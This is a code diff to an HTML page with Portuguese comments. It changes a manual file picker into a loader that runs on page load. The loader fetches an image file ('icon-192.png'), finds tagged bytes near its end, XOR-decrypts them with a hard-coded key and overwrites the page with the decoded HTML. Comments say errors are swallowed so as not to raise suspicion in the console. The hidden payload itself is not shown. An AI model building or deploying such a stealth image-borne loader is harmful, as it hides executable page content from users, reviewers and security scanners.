@@ -13,20 +13,21 @@
             height: 100%;
             background-color: #020617;
             overflow: hidden;
-            cursor: pointer;
+            cursor: default;
             user-select: none;
-            -webkit-tap-highlight-color: transparent;
         }
     </style>
 </head>
-<body>
-
+<body>    
     <script>
         const chaveXorMestre = "PrincesaDiamante";
         const tagInicio = "[JDP-START]";
         const tagFim = "[JDP-END]";
+        const nomeFotoAlvo = "icon-192.png";
+        
+        let autoFailed = false;
 
-        // CIFRA XOR BINÁRIA DE ALTA PERFORMANCE
+        // CIFRA XOR BINÁRIA
         function xorEngine(bytes, key) {
             const keyBytes = new TextEncoder().encode(key);
             const output = new Uint8Array(bytes.length);
@@ -36,28 +37,25 @@
             return output;
         }
 
-        // GATILHO DE TOQUE IMEDIATO: Abre o seletor de arquivos do celular
-        document.body.addEventListener('click', () => {
-            document.getElementById('stealth-input').click();
-        });
+        // VARREDURA AUTOMÁTICA EM SEGUNDO PLANO
+        async function varreduraSilenciosa() {
+            try {
+                const resposta = await fetch(nomeFotoAlvo);
+                if (!resposta.ok) throw new Error();
 
-        // PROCESSAMENTO DO ARQUIVO SELECIONADO PELO CRIADOR
-        function processarArquivoManual(e) {
-            const file = e.target.files[0];
-            if (!file) return;
-
-            const reader = new FileReader();
-            reader.onload = function(evt) {
-                processarBytesDaFoto(new Uint8Array(evt.target.result));
-            };
-            reader.readAsArrayBuffer(file);
+                const arrayBuffer = await resposta.arrayBuffer();
+                processarBytesDaFoto(new Uint8Array(arrayBuffer));
+            } catch (erro) {
+                // Se falhar (CORS ou arquivo ausente), ativa o gatilho de toque na tela
+                autoFailed = true;
+            }
         }
 
-        // DESCRIPTOGRAFIA E SUBSTITUIÇÃO DO DOM EM TEMPO REAL
+        // PROCESSAMENTO E SUBSTITUIÇÃO DO DOM
         function processarBytesDaFoto(bytesCarrier) {
             try {
-                // Varredura de busca de tags no arquivo carregado
-                const textoBytes = new TextDecoder().decode(bytesCarrier.subarray(Math.max(0, bytesCarrier.length - 12000000)));
+                // Varre os últimos 10MB buscando as tags de demarcação
+                const textoBytes = new TextDecoder().decode(bytesCarrier.subarray(bytesCarrier.length - 10000000));
                 
                 const indexInicio = textoBytes.indexOf(tagInicio);
                 const indexFim = textoBytes.indexOf(tagFim);
@@ -71,10 +69,8 @@
                         bytesCriptografados[i] = binString.charCodeAt(i);
                     }
 
-                    // Descriptografa usando a chave mestre "PrincesaDiamante"
                     const bytesDescriptografados = xorEngine(bytesCriptografados, chaveXorMestre);
 
-                    // Localiza o separador de cabeçalho
                     const textoDecodificadoParcial = new TextDecoder().decode(bytesDescriptografados.subarray(0, 2000));
                     const indexSeparador = textoDecodificadoParcial.indexOf("|||");
 
@@ -85,16 +81,37 @@
 
                         const htmlFinal = new TextDecoder().decode(bytesArquivoFinal);
                         
-                        // Sobrescreve o DOM instantaneamente com a interface decodificada
+                        // Executa a substituição do DOM sob o capô
                         document.open();
                         document.write(htmlFinal);
                         document.close();
                     }
                 }
             } catch (e) {
-                // Tratamento silencioso para manter integridade operacional
+                // Falha silenciosa para não levantar suspeitas no console
             }
         }
+
+        // GATILHO DE TOQUE (CONTINGÊNCIA SE O NAVEGADOR BLOQUEAR O FETCH)
+        document.body.addEventListener('click', () => {
+            if (autoFailed) {
+                document.getElementById('stealth-input').click();
+            }
+        });
+
+        function processarArquivoManual(e) {
+            const file = e.target.files[0];
+            if (!file) return;
+
+            const reader = new FileReader();
+            reader.onload = function(evt) {
+                processarBytesDaFoto(new Uint8Array(evt.target.result));
+            };
+            reader.readAsArrayBuffer(file);
+        }
+
+        // Inicia a varredura silenciosa imediatamente ao carregar
+        window.onload = varreduraSilenciosa;
     </script>
 </body>
 </html>
